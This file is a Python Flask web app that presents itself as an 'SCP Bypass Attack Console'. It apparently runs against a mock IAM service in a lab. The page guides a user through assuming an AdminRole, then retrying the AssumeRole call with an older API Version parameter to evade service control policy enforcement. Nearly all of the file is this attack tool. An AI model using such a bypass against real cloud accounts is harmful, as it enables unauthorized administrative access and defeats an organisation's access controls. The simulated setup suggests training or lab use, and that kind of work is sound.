"""SCP Bypass — discover SCP restriction, bypass with old API version."""
import os, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML="""<!DOCTYPE html><html><head><title>SCP Bypass</title></head><body>
<h1>SCP Bypass Attack Console</h1>
<p>Attempt to assume AdminRole. SCP policies may block this — try different API versions.</p>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: Test AssumeRole (default version)</strong>
<form method=post action=/step1>
<label>Access Key: <input name=ak value="AKIASCBPASSEXAMPLE" size=25></label><br>
<label>Secret Key: <input name=sk value="scp-bypass-secret" size=25></label><br>
<button>Assume Role</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Try with Old API Version</strong>
<p><small>Older API versions may predate SCP enforcement.</small></p>
<form method=post action=/step2>
<label>Access Key: <input name=ak value="AKIASCBPASSEXAMPLE" size=25></label><br>
<label>Secret Key: <input name=sk value="scp-bypass-secret" size=25></label><br>
<label>API Version: <input name=version value="2010-05-08" size=15></label><br>
<button>Assume Role (Old API)</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — try Step 1 first, then Step 2 with an older API version")

@app.route("/step1", methods=["POST"])
def step1():
    ak = request.form.get("ak", "")
    sk = request.form.get("sk", "")
    try:
        body = urllib.parse.urlencode({
            "Action": "AssumeRole",
            "RoleArn": "arn:aws:iam::000000000000:role/AdminRole",
            "RoleSessionName": "scp-test",
            "AccessKeyId": ak,
            "SecretAccessKey": sk,
        })
        r = urllib.request.urlopen(urllib.request.Request(
            f"{IAM}/", data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=10)
        return render_template_string(HTML, output=f"[+] Success! Response:\n{r.read().decode()}")
    except urllib.error.HTTPError as e:
        err = e.read().decode()
        return render_template_string(HTML, output=f"[-] Blocked (HTTP {e.code}):\n{err}\n\n[→] The error mentions SCP. Try Step 2 with an older API version that might predate SCP enforcement.")

@app.route("/step2", methods=["POST"])
def step2():
    ak = request.form.get("ak", "")
    sk = request.form.get("sk", "")
    version = request.form.get("version", "2010-05-08")
    try:
        body = urllib.parse.urlencode({
            "Action": "AssumeRole",
            "RoleArn": "arn:aws:iam::000000000000:role/AdminRole",
            "RoleSessionName": "scp-bypass",
            "AccessKeyId": ak,
            "SecretAccessKey": sk,
            "Version": version,
        })
        r = urllib.request.urlopen(urllib.request.Request(
            f"{IAM}/", data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=10)
        return render_template_string(HTML, output=f"[+] SCP Bypassed! Response:\n{r.read().decode()}\n\n[→] The old API version ({version}) bypassed SCP enforcement!")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] Still blocked (HTTP {e.code}):\n{e.read().decode()}\n[→] Try an even older version like 2010-01-01")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
